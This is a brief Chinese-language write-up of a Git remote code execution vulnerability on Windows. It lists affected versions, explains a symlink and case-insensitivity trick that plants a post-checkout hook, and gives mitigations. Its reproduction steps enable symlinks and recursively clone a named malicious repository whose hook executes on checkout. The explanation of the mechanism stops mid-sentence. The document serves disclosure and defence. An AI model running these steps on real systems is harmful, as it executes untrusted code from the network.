# Git 远程代码执行

# 漏洞环境

- windows10 系统
- Git-2.45.0/2.44.0/2.43.0-2.43.4/2.42.0-2.42.2/2.41.0/2.40.0-2.40.2/<2.39.4
- git 开启符号链接支持

# 漏洞复现步骤

1、在Win10安装Git-2.39.1

2、配置好 SSH key 以后，打开 git 的符号链接支持`git config --global core.symlinks true `

3、克隆恶意仓库，仓库中命令会被执行`git clone --recursive git@github.com:amalmurali47/git_rce.git`

# 漏洞原理

首先利用了 Git 的 hook 功能。详情见*[ Git官方文档 ](https://git-scm.com/docs/githooks)*

然后利用了windows文件系统大小写不区分的特点，在恶意仓库中有两个文件夹分别为`A`与`a`，且`a`文件夹为符号链接，链接到了 `.git`文件夹中，而`A`是一个子模块，在其中有一个`hooks`文件夹，该文件夹中含有恶意脚本`post-checkout`，这个脚本会在



# 防御措施

1、升级 git 版本

2、禁用 git 的符号链接功能

3、不要克隆来路不明的恶意仓库